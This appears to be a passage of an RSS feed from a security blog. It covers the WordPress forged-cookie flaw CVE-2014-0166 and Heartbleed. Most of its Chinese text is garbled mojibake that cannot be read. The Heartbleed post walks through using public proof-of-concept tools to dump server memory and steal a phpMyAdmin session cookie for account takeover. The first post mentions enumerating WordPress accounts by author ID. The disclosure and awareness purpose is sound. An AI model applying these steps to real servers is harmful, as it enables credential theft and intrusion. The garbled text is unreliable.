  &lt;p&gt;Ë®ªÔºö‰∏ÄËà¨ÁãÄÊ≥ÅÔºåËã•‰∏çÁü•ÈÅì WordPress ÊúÄÈ´òÊ¨äÈôêÁöÑÂ∏≥ËôüÔºåÂèØ‰ª•Âà©Áî® WordPress ÁöÑ feature Âú® http://your.WordPress.com/?author=$id ($id: 1,2,3,4‚Ä¶,999,‚Ä¶) È†ÅÈù¢‰∏≠ÂàóËàâÊâÄÊúâ‰ΩøÁî®ËÄÖÂ∏≥Ëôü„ÄÇÈÄöÂ∏∏ $id = 1 ÁöÑ author ÈÉΩÊúâ WordPress ÁöÑÁÆ°ÁêÜÊ¨äÈôê„ÄÇ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;ÊúÄËøëÂá∫Áèæ‰∫Ü‰∏ÄÂÄãÈ´òÈ¢®Èö™ÈÄöÂ†± CVE-2014-0166ÔºåÂÖ∂‰∏≠ÊèêÂèä WordPress Âú®ËàäÁâàÈ©óË≠â cookie ÁöÑÈÉ®ÂàÜÂá∫ÁèæÂº±ÈªûÔºåÂèØ‰ª•ÂÅΩÈÄ†ÂêàÊ≥ï cookieÔºåÈÄ≤ËÄåÂèñÂæó WordPress ÁÆ°ÁêÜÊ¨äÈôê„ÄÇÊú¨ÊñáÂàÜÊûê‰∫ÜÂÖ∂ÂéüÁêÜÔºå‰∏¶‰∏îË≠âÂØ¶‰πã„ÄÇ&lt;/p&gt;

&lt;p&gt;Â∞çÊñºÊîªÊìäËÄÖËÄåË®ÄÔºåÈõñÁÑ∂ÊØèÊ¨°ÂÅΩÈÄ† cookie ÊàêÂäüÁöÑÊ©üÁéáÁ¥ÑÁÇ∫‰∏âÂÑÑÂàÜ‰πã‰∏Ä‰∏¶‰∏çÈ´òÔºå‰ΩÜÁôºÈÄÅ‰∏âÂÑÑÂÄã request ÂæåÊàñË®±ËÉΩÊãøÂà∞ÊúÄÈ´òÊ¨äÈôêÔºåÂ∑≤Á∂ìÊòØÂÄºÂæóÊäïË≥áÁöÑÁ¥öÊï∏„ÄÇ&lt;/p&gt;

&lt;p&gt;Â∞çÊñº WordPress ÁÆ°ÁêÜËÄÖËÄåË®ÄÔºåÂª∫Ë≠∞Á´ãÂç≥Êõ¥Êñ∞Ëá≥ 3.8.2 ‰ª•ÂæåÁâàÊú¨Ôºå‰ª•ÂÖçÂèóÂà∞Ê≠§È¢®Èö™ÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂæûÊ≠§‰∫ã‰ª∂‰πüÊèêÈÜí‰∫Ü PHP ÈñãÁôºËÄÖÔºåÂú®Êí∞ÂØ´ÈáçË¶ÅÁöÑÈ©óË≠âË°åÁÇ∫ÔºåË¶ÅÁâπÂà•Ê≥®ÊÑè PHP ÊØîËºÉÈÅãÁÆóÂ≠êÁöÑÁâπÊÄßÔºåË´ã‰ΩøÁî® === (‰∏çÁ≠âÊñºË´ãÁî® !==)‰æÜ‰øùË≠âÁ≠âÂºèÂ∑¶Âè≥ÂûãÊÖãËàáÂÄºÁÇ∫‰∏ÄÊ®£ÔºåÈÅøÂÖçÂõ†ÁÇ∫ËΩâÂûãÈÄ†ÊàêÁöÑË≥áÂÆâÈ¢®Èö™„ÄÇ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/</link>
                <guid>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</guid>
                <pubDate>Wed, 16 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL Heartbleed ÂÖ®ÁêÉÈß≠ÂÆ¢ÁöÑÊÆ∫ÊàÆÁ•≠ÂÖ∏Ôºå‰Ω†ÂèÉËàá‰∫ÜÂóéÔºü</title>
                <description>&lt;p&gt;‰Ω†Ë∑ü‰∏ä‰∫Ü OpenSSL Heartbleed ÁöÑÁ•≠ÂÖ∏‰∫ÜÂóéÔºüÂ¶ÇÊûúÈÇÑÊ≤íÊúâÔºåÂà•ÂøòË®òË©≥Á¥∞Èñ±ËÆÄ‰∏Ä‰∏ãÊàëÂÄëÁöÑÂâçÊñá„Äå&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed Âö¥ÈáçÊºèÊ¥û&lt;/a&gt;„Äç„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂπæÂ§©‰∏çÂ∞ë‰ºÅÊ•≠„ÄÅÊ∞ëÁúæÈÉΩ‰∏çÊñ∑‰æÜË©¢ÂïèÊàëÂÄëÁõ∏Â∞çÊáâÁöÑËß£Ê±∫ÊñπÊ°àÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed Ë∑üÊàëÊúâÈóúÂóéÔºüÊàëË©≤ÊÄéÈ∫ºÁü•ÈÅìÔºü&lt;/li&gt;
  &lt;li&gt;ÊàëË©≤ÊÄéÈ∫ºÊõ¥Êñ∞ OpenSSLÔºü&lt;/li&gt;
  &lt;li&gt;ÊàëÂ¶ÇÊûú‰∏çËÉΩÊõ¥Êñ∞ÔºåË¶ÅÊÄéÈ∫ºÈò≤Ê≠¢ÊîªÊìäÔºü&lt;/li&gt;
  &lt;li&gt;Heartbleed ÊºèÊ¥ûÊîªÊìäËÄÖÊúÉÊÄéÈ∫ºÂà©Áî®Ôºü&lt;/li&gt;
  &lt;li&gt;ÁõÆÂâçÂèóÂÆ≥ÁöÑÁãÄÊ≥ÅÂ¶Ç‰ΩïÔºü&lt;/li&gt;
  &lt;li&gt;ÊàëÂè™ÊòØ‰∏ÄËà¨Ê∞ëÁúæÔºåË©≤Â¶Ç‰ΩïÊáâÂ∞çÔºü&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊàëÁõ∏‰ø°‰∏çÂ∞ë‰∫∫ÈÉΩÊúâÈ°û‰ººÁöÑÁñëÂïèÔºåÊàëÂÄë‰ª•ÈÄôÁØáÂ∞àÊñáË£úÈÅ∫‰∏äÊ¨°Ê≤íÊèêÂà∞ÁöÑË≥áË®ä„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÊîªÊìäÊâãÊ≥ïÁ§∫ÁØÑ&quot;&gt;ÊîªÊìäÊâãÊ≥ïÁ§∫ÁØÑ&lt;/h3&gt;

&lt;p&gt;Â§ßÂÆ∂ÈÉΩË™™ OpenSSL Heartbleed ÊºèÊ¥ûÂèØÊúõÁÇ∫Êú¨Âπ¥Â∫¶ÊúÄÂö¥ÈáçÁöÑÊºèÊ¥ûÔºåÂà∞Â∫ïÊúâÂ§öÂö¥ÈáçÂë¢ÔºüÊàëÁõ∏‰ø°Ê≤íÊúâÁúãÂà∞ÊîªÊìäÁöÑÁØÑ‰æãÊòØÊ≤íÊúâÊÑüË¶∫ÁöÑ„ÄÇÂ§ßÂÆ∂ÂèØ‰ª•ÂÖàÁúãÁúã‰ª•‰∏ãÁöÑÂΩ±ÁâáÔºåÂà©Áî®ÊúÄÂÖàÈáãÂá∫ÁöÑÂÖ©ÂÄãÁ∞°ÂñÆÁöÑ PoC exploit ÔºàÂº±ÈªûÂà©Áî®Á®ãÂºèÔºâ„Äåssltest.py„Äç‰ª•Âèä„Äåcheck-ssl-heartbleed.pl„ÄçÔºå‰æÜÊ™¢Ê∏¨‰º∫ÊúçÂô®ÊòØÂê¶Êúâ Heartbleed ÂïèÈ°å„ÄÇÊ™¢Ê∏¨ÁöÑÂêåÊôÇÂèØ‰ª•Áç≤Âèñ‰º∫ÊúçÂô®Ë®òÊÜ∂È´î‰∏≠ÁöÑË≥áË®äÔºåÂÖ∂‰∏≠Â∞±ÂèØËÉΩÂåÖÂê´‰∫ÜÊ©üÊïèË≥áË®ä„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÆìÊàëÂÄë‰æÜÁúãÁúãÂêßÔºÅ&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/kFGzu0-cIxE&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;È¶ñÂÖàÂà©Áî® &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;ssltest.py&lt;/a&gt; ‰æÜÊ∏¨Ë©¶Ôºå‰æÜÁúã‰º∫ÊúçÂô®ÊòØÂê¶ÊúâË¢´ heartbleed ÊºèÊ¥ûÂΩ±ÈüøÔºåfbi.gov Âú®Á¨¨‰∏âÂ§©Â∑≤Á∂ì‰øÆÂæ©ÈÄôÂÄãÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;Âà©Áî® ssltest.py ‰æÜÊ∏¨Ë©¶‰º∫ÊúçÂô®ÊòØÂê¶Êúâ Heartbleed ÊºèÊ¥û„ÄÇ&quot; title=&quot;Âà©Áî® ssltest.py ‰æÜÊ∏¨Ë©¶‰º∫ÊúçÂô®ÊòØÂê¶Êúâ Heartbleed ÊºèÊ¥û„ÄÇ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÊòØÊ™¢Ê∏¨‰∏ÄÂÄãÊúâÊºèÊ¥ûÁöÑÁ∂≤Á´ôÔºåÈÄôÂÄãÂ∑•ÂÖ∑ÊúÉÁõ¥Êé•ÊääË®òÊÜ∂È´îÁöÑÂÖßÂÆπÈ°ØÁ§∫Âá∫‰æÜÔºåÂÖ∂‰∏≠ÂèØËÉΩÂåÖÊã¨ http ÂÇ≥Ëº∏ÁöÑË≥áÊñô„ÄÅÂ∏≥ËôüÂØÜÁ¢º„ÄÅÁßÅÂØÜÈáëÈë∞Á≠â„ÄÇÂú®ÈÄôÂÄã‰æãÂ≠ê‰∏≠ÔºåÊîªÊìäÁ®ãÂºèËÆÄÂèñÂà∞‰ΩøÁî®ËÄÖÈÄÅÂá∫ÁöÑ formÔºåËã•ÂÖ∂‰∏≠ÂåÖÂê´ÂÄãË≥áÂ∞áÊúÉË¢´‰∏ÄË¶ΩÁÑ°ÈÅ∫ÔºåÈùûÂ∏∏Âç±Èö™„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;Âà©Áî® ssltest.py ÊäìÂá∫Ë®òÊÜ∂È´î‰∏≠ÁöÑË≥áÊñôÔºåÂÖ∂‰∏≠ÂåÖÊã¨ HTTP ÂÇ≥Ëº∏ÂÖßÂÆπ„ÄÇ&quot; title=&quot;Âà©Áî® ssltest.py ÊäìÂá∫Ë®òÊÜ∂È´î‰∏≠ÁöÑË≥áÊñôÔºåÂÖ∂‰∏≠ÂåÖÊã¨ HTTP ÂÇ≥Ëº∏ÂÖßÂÆπ„ÄÇ&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âè¶‰∏ÄÂÄãÂ∑•ÂÖ∑ &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;check-ssl-heartbleed.pl&lt;/a&gt; ÂèØ‰ª•‰ΩøÁî® -R ÂèÉÊï∏ÂÅöÊõ¥ÊúâÊïàÁöÑÂà©Áî®„ÄÇÁõ¥Êé•Âü∑Ë°åÊåá‰ª§ÂèØ‰ª•Âø´ÈÄüÈ°ØÁ§∫‰º∫ÊúçÂô®ÊúâÁÑ°ÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;Âà©Áî® check-ssl-heartbleed.pl ‰æÜÊ™¢Êü•‰º∫ÊúçÂô®ÊòØÂê¶Êúâ heartbleed ÂïèÈ°å„ÄÇ&quot; title=&quot;Âà©Áî® check-ssl-heartbleed.pl ‰æÜÊ™¢Êü•‰º∫ÊúçÂô®ÊòØÂê¶Êúâ heartbleed ÂïèÈ°å„ÄÇ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûú‰ΩøÁî®„Äå-R„ÄçÂèÉÊï∏‰∏¶‰∏îÊåáÂÆöÁâπÂÆöÁöÑÊ≠£Ë¶èË°®Á§∫ÂºèÔºåÂèØ‰ª•ÊäìÂá∫ÊÉ≥Ë¶ÅÁç≤ÂèñÁöÑË≥áÊñô„ÄÇ‰æãÂ¶Ç Cookie„ÄÅÂ∏≥ËôüÂØÜÁ¢ºÁ≠â„ÄÇ‰ª•Ê≠§‰æãÔºåÊàëÂÄëÁü•ÈÅìÈÄôÂÄãÁ∂≤Á´ôÊèê‰æõ &lt;a href=&quot;http://www.phpmyadmin.net&quot;&gt;phpMyAdmin&lt;/a&gt; Â•ó‰ª∂ÔºåÂõ†Ê≠§Áõ¥Êé•ÈéñÂÆö„ÄåpmaPass„ÄçË≥áÊñô‰æÜÊäìÂèñÔºåÊ≤íÊÉ≥Âà∞Á¨¨‰∏ÄÊ¨°Â∞±ÊäìÂà∞‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;Âà©Áî® check-ssl-heartbleed.pl ÊäìÂá∫ÁâπÂÆöÊ©üÊïèË≥áÊñô„ÄÇ&quot; title=&quot;Âà©Áî® check-ssl-heartbleed.pl ÊäìÂá∫ÁâπÂÆöÊ©üÊïèË≥áÊñô„ÄÇ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Êé•ËëóÊîªÊìäËÄÖÂè™Ë¶ÅÊääÈÄôÂÄãÁç≤ÂèñÂà∞ÁöÑ Cookie Â≠òÂÖ•Ëá™Â∑±ÁöÑÁÄèË¶ΩÂô®‰∏≠ÔºåÂ∞±ÂèØ‰ª•Â¶ÇÂΩ±Áâá‰∏≠ÁõúÁî®ÈÄôÂÄãÂ∏≥Ëôü„ÄÇÊòØÂê¶ÂæàÂç±Èö™Âë¢Ôºü&lt;/p&gt;

&lt;p&gt;Èô§‰∫ÜÈÄôÁ®ÆÂà©Áî®ÊñπÊ≥ï‰πãÂ§ñÔºåÈÇÑÊúâÊõ¥Â§öÊÉÖÊ≥ÅÊòØÁõ¥Êé•Êää‰ΩøÁî®ËÄÖÁôªÂÖ•ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÁõ¥Êé•È°ØÁ§∫Âá∫‰æÜÁöÑÔºåÂõ†Ê≠§Â¶ÇÊûú‰º∫ÊúçÂô®Ê≤íÊúâÂÅöÂ•ΩÈò≤Á¶¶ÊàñÊõ¥Êñ∞ÔºåÊï¥ÂÄãÁ∂≤Á´ôÁöÑ‰ΩøÁî®ËÄÖË≥áÊñôÈÉΩÂèØ‰ª•Âõ†Ê≠§Â§ñÊ¥©„ÄÇÈÄô‰πüÊòØÁÇ∫‰ªÄÈ∫ºÊàëÂÄë‰∏ÄÁõ¥Âº∑Ë™ø‰º∫ÊúçÂô®ÁÆ°ÁêÜËÄÖÂøÖÈ†àË¶ÅÊõ¥Êñ∞ÈáëÈë∞„ÄÅÂÖ®Á´ô‰ΩøÁî®ËÄÖÂ∏≥ËôüÂØÜÁ¢ºÁ≠âÔºå‰ª•Èò≤ÊúâÂøÉ‰∫∫Â£´ÂÄüÊ≠§ÊíàÂèñË≥áÊñô„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ë™∞Âú®Âà©Áî®-heartbleed-ÊºèÊ¥ûÁ´äÂèñË≥áÊñôÂë¢&quot;&gt;Ë™∞Âú®Âà©Áî® Heartbleed ÊºèÊ¥ûÁ´äÂèñË≥áÊñôÂë¢Ôºü&lt;/h3&gt;

&lt;p&gt;Áî± github ‰∏äÈù¢ÁöÑ &lt;a href=&quot;https://github.com/openssl/openssl/commit/4817504d069b4c5082161b02a22116ad75f822b1&quot;&gt;commit Ë®òÈåÑ&lt;/a&gt;ÔºåÂá∫ÂïèÈ°åÁöÑÈÇ£Ë°åÁ®ãÂºèÁ¢ºÊòØÂú® 2011-12-31 22:59:57 commit ÁöÑÔºå‰∏çÁü•ÈÅìÊòØÈñãÁôºËÄÖÂ§™Á¥ØÈÇÑÊòØ NSA ÁöÑÈô∞Ë¨Ä„ÄÇÊ†πÊìö Bloomberg ÁöÑ&lt;a href=&quot;http://www.bloomberg.com/news/2014-04-11/nsa-said-to-have-used-heartbleed-bug-exposing-consumers.html&quot;&gt;Â†±Â∞é&lt;/a&gt;ÊåáÂá∫ÔºåÁü•ÊÉÖ‰∫∫Â£´Ë°®Á§∫ NSA Êó©Âú®&lt;strong&gt;ÂÖ©Âπ¥Ââç&lt;/strong&gt;Â∞±Â∑≤Á∂ìÁü•ÈÅìÊ≠§ÊºèÊ¥ûÔºå‰∏¶‰∏î&lt;strong&gt;Âà©Áî®ÈÄôÂÄãÊºèÊ¥ûÁ´äÂèñË®±Â§öÁ∂≤Á´ôÁöÑÊ©üÊïèË≥áÊñô&lt;/strong&gt;„ÄÇÈÄô‰ª£Ë°® NSA Âú®‰∏ÄÈñãÂßãÂ∞±Áü•ÈÅìÈÄôÂÄãÊºèÊ¥ûÔºå‰ª§‰∫∫‰∏çÁ¶ÅÊúâÂÖ∂‰ªñËÅØÊÉ≥„ÄÇ&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The U.S. National Security Agency knew for at least two years about a flaw in the way that many websites send sensitive information, now dubbed the Heartbleed bug, and regularly used it to gather critical intelligence, two people familiar with the matter said.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Âú®‰πãÂâç&lt;a href=&quot;http://hitcon.org&quot;&gt;Âè∞ÁÅ£Èß≠ÂÆ¢Âπ¥ÊúÉ (HITCON)&lt;/a&gt; 2013 ÁöÑË¨õÂ∏´ Rahul Sasi (Garage4Hackers) ÂÖ¨Â∏É‰∫Ü&lt;a href=&quot;https://bitbucket.org/fb1h2s/cve-2014-0160/src/bba16b3eedef0e92bd91fea496b00c92eb515e29/Heartbeat_scanner.py?at=master&quot;&gt;Â§ßÈáèÊéÉÊèè Heartbleed ÊºèÊ¥ûÁöÑÁ®ãÂºè&lt;/a&gt;Ôºå‰πüÂèØ‰ª•‰æõÁ†îÁ©∂‰∫∫Âì°Ëá™Ë°åÁ†îÁ©∂ÔºåÊàñËÄÖÊòØÂ∞ãÊâæËá™Â∑±ÁÆ°ÁêÜÁöÑ‰∏ªÊ©ü‰∏≠ÊúâÂ§öÂ∞ëÂåÖÂê´ÈÄôÂÄãÈ¢®Èö™ÁöÑ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â∏∏Ë¶ãÂïèÈ°å&quot;&gt;Â∏∏Ë¶ãÂïèÈ°å&lt;/h3&gt;

&lt;h3 id=&quot;openssl-ÊòØ‰ªÄÈ∫ºiis-ÊúÉÂèó-heartbleed-ÊºèÊ¥ûÂΩ±ÈüøÂóé&quot;&gt;OpenSSL ÊòØ‰ªÄÈ∫ºÔºüIIS ÊúÉÂèó Heartbleed ÊºèÊ¥ûÂΩ±ÈüøÂóéÔºü&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.openssl.org&quot;&gt;OpenSSL&lt;/a&gt; ÊòØ‰∏ÄÂÄãÂáΩÂºèÂ∫´ÔºàLibraryÔºâÔºåÂú® UNIX Á≥ªÂàóÁöÑÊúçÂãôËã•Êúâ‰ΩøÁî® SSLÔºåÈÄöÂ∏∏ÈÉΩÊúÉ‰ΩøÁî® OpenSSL„ÄÇÂõ†Ê≠§ÈÄôÊ¨°ÁöÑÊºèÊ¥û‰∏¶Êú™ÂΩ±ÈüøÂæÆËªü IIS„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Êàë‰ΩøÁî®-openssl-098Â§™Â•Ω‰∫ÜÊàëÁî®ËàäÁâàÊàëÂ•ΩÂÆâÂÖ®&quot;&gt;Êàë‰ΩøÁî® OpenSSL 0.9.8ÔºåÂ§™Â•Ω‰∫ÜÊàëÁî®ËàäÁâàÊàëÂ•ΩÂÆâÂÖ®ÔºÅ&lt;/h3&gt;

&lt;p&gt;‰Ω†ËÅΩÈÅé &lt;a href=&quot;http://en.wikipedia.org/wiki/Transport_Layer_Security#BEAST_attack&quot;&gt;BEAST&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/BREACH_%28security_exploit%29&quot;&gt;BREACH&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/CRIME_%28security_exploit%29&quot;&gt;CRIME&lt;/a&gt;, &lt;a href=&quot;http://www.isg.rhul.ac.uk/tls/Lucky13.html&quot;&gt;Lucky 13&lt;/a&gt; ÂóéÔºü&lt;/p&gt;

&lt;h3 id=&quot;ÊàëÊ≤íÊúâ‰ΩøÁî®-httpsÊâÄ‰ª•ÊàëÂæàÂÆâÂÖ®&quot;&gt;ÊàëÊ≤íÊúâ‰ΩøÁî® HTTPSÔºåÊâÄ‰ª•ÊàëÂæàÂÆâÂÖ®ÔºÅ&lt;/h3&gt;

&lt;p&gt;„ÄÇ„ÄÇ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Âè™ÊúâÁ∂≤È†Å‰º∫ÊúçÂô®http-serverÊúÉÂèóÂΩ±ÈüøÂóé&quot;&gt;Âè™ÊúâÁ∂≤È†Å‰º∫ÊúçÂô®ÔºàHTTP ServerÔºâÊúÉÂèóÂΩ±ÈüøÂóéÔºü&lt;/h3&gt;

&lt;p&gt;‰∏çÂè™ÔºÅÂè™Ë¶Å‰ΩøÁî® OpenSSL ÊîØÊè¥ STARTTLS ÁöÑÊúçÂãôÈÉΩÂú®ÂΩ±ÈüøÁØÑÂúçÔºåÂåÖÊã¨ HTTPS„ÄÅIMAPS„ÄÅPOPS„ÄÅSMTPS Á≠â‰º∫ÊúçÂô®„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Âè™ÊúâËá™Â∑±Êû∂Ë®≠ÁöÑ‰º∫ÊúçÂô®ÊúÉÂèóÂΩ±ÈüøÂóé&quot;&gt;Âè™ÊúâËá™Â∑±Êû∂Ë®≠ÁöÑ‰º∫ÊúçÂô®ÊúÉÂèóÂΩ±ÈüøÂóéÔºü&lt;/h3&gt;

&lt;p&gt;Áï∂ÁÑ∂‰∏çÂè™ÔºÅÁõÆÂâçÂ∑≤Á∂ìÂá∫ÁèæÂêÑÂ§ßË®≠ÂÇôÂª†ÂïÜÈÉΩÈÅ≠ÈÅáÂà∞ÈÄôÊ®£ÁöÑÂïèÈ°å„ÄÇÂêÑÂ§ßË®≠ÂÇôÂª†ÂïÜ„ÄÅ‰ΩúÊ•≠Á≥ªÁµ±Á≠âÂΩ±ÈüøÁãÄÊ≥ÅÔºåÂèØ‰ª•ÂèÉÈñ±‰ª•‰∏ãÊñáÁ´†„ÄÇ&lt;/p&gt;

&lt;p&gt;CERT: OpenSSL heartbeat extension read overflow discloses sensitive information
&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&quot;&gt;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âª†ÂïÜÁöÑË®≠ÂÇôÁõÆÂâçÁãÄÊ≥ÅÁâπÂà•Âö¥ÈáçÔºåÂõ†ÁÇ∫ÊâÄÊúâÂêåÂÄãÁâàÊú¨ÁöÑË®≠ÂÇôÈÉΩÊúÉÂèóÂΩ±ÈüøÔºåËÄåÂú®Âª†ÂïÜÈáãÂá∫Êõ¥Êñ∞‰πãÂâçÔºåÂè™ËÉΩË¢´ÂãïÁöÑÁ≠âÂæÖÊõ¥Êñ∞„ÄÇËã•Ê≤íÊúâÁπºÁ∫åÁ∞ΩË®ÇÁ∂≠Ë≠∑Á¥ÑÁöÑË®≠ÂÇôÔºå‰πüÂè™ËÉΩÁπºÁ∫åË∑üÂª†ÂïÜÁ∞ΩÁ¥ÑÊõ¥Êñ∞ÔºåÊàñËÄÖÊòØÁúãÂª†ÂïÜÊòØÂê¶ÂèØ‰ª•Áõ¥Êé•Êèê‰æõÊõ¥Êñ∞Ê™î„ÄÇÂ¶ÇÊûúÊúâ VPN Server Á≠âÊúçÂãôÊõ¥Ë¶ÅÊ≥®ÊÑèÔºåÂ¶ÇÊûúË¢´ÊîªÊìäËÄÖÂèñÂæóÂ∏≥ËôüÂØÜÁ¢ºÔºåÁ≠âÊñºÂ¶ÇÂÖ•ÁÑ°‰∫∫‰πãÂ¢ÉÔºåÁõ¥Êé•‰ΩøÁî®‰Ω†ÁöÑÂ∏≥ËôüÁôªÂÖ•Âà∞‰ºÅÊ•≠ÂÖßÁ∂≤Ôºå‰∏çÂèØ‰∏çÊÖé„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂêÑÂÆ∂Á≥ªÁµ±Êõ¥Êñ∞ÁöÑÈÄüÂ∫¶&quot;&gt;ÂêÑÂÆ∂Á≥ªÁµ±Êõ¥Êñ∞ÁöÑÈÄüÂ∫¶Ôºü&lt;/h3&gt;

&lt;p&gt;ÂºïËø∞Ëá™Â•ΩÊúãÂèã Ant ÁöÑ&lt;a href=&quot;http://blog.gcos.me/2014-04-10_openssl-cve-2014-0160-security-issue.html&quot;&gt;ÊñáÁ´†&lt;/a&gt;ÔºåÂêÑÂÆ∂‰ΩúÊ•≠Á≥ªÁµ±„ÄÅÁ∂≤Á´ôÁöÑÊõ¥Êñ∞ÈÄüÂ∫¶Ôºå‰ª£Ë°®Ëëó‰ºÅÊ•≠ÈáçË¶ñË≥áÂÆâÁöÑÁ®ãÂ∫¶‰ª•ÂèäÈáùÂ∞çË≥áÂÆâ‰∫ã‰ª∂Á∑äÊÄ•ÊáâËÆäÁöÑÊïàÁéáÔºå‰πüÂèØ‰ª•‰ΩúÁÇ∫ÊàëÂÄëÊåëÈÅ∏Á≥ªÁµ±„ÄÅÁ∂≤Á´ô„ÄÅÂª†ÂïÜÁöÑ‰æùÊìö„ÄÇ&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;‰∫å„ÄÅ‰ΩúÊ•≠Á≥ªÁµ±ÁöÑÊõ¥Êñ∞ÈÄ≤Â∫¶&lt;/p&gt;

  &lt;p&gt;ÂæûË≥áÂÆâ‰∫ã‰ª∂ÁöÑËôïÁêÜÂèØ‰ª•Êé®Êï≤Âá∫ÂêÑ‰ΩúÊ•≠Á≥ªÁµ±ÂïÜÂ∞çÊñºÁ∑äÊÄ•‰∫ã‰ª∂ÁöÑÂèçÊáâÈÄüÂ∫¶„ÄÇ
ÊôÇÈñìËª∏ÔºåÊåâÁÖß‰øÆÂæ©ÁöÑÂÖàÂæåÊéíÂàóÔºö&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;OpenSSL (Ë≥áÂÆâÂº±ÈªûÁöÑ‰∏ªËßí) Á¨¨‰∏ÄÊ¨°ÂÖ¨ÈñãÊè≠Èú≤ÁöÑÊôÇÈñìÁ¥ÑÂú® 2014Âπ¥4Êúà6Êó• 0ÊôÇ„ÄÇ&lt;/li&gt;
    &lt;li&gt;RedHat Âú® 2014Âπ¥4Êúà7Êó• 07:47:00 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;OpenSSL Ê≠£ÂºèÁ¢∫Ë™ç‰∏¶‰øÆÂæ©ÁöÑÊôÇÈñìÁ¥ÑÂú® 2014Âπ¥4Êúà7Êó•16ÊôÇ„ÄÇ&lt;/li&gt;
    &lt;li&gt;OpenBSD Á¥ÑÂú® 2014Âπ¥4Êúà7Êó• 20:17 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;Arch Linux Á¥ÑÂú® 2014Âπ¥4Êúà7Êó• 20:36 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;Debian Á¥ÑÂú® 2014Âπ¥4Êúà7Êó• 21:45 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;FreeBSD Á¥ÑÂú® 2014Âπ¥4Êúà7Êó• 21:46 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;Ubuntu Á¥ÑÂú® 2014Âπ¥4Êúà7Êó• 21:48 Ê≠£Âºè‰øÆÂæ©„ÄÇ
(2014Âπ¥4Êúà8Êó•ÂàÜÈöîÂçÄ)&lt;/li&gt;
    &lt;li&gt;Fedora Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 00:33 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
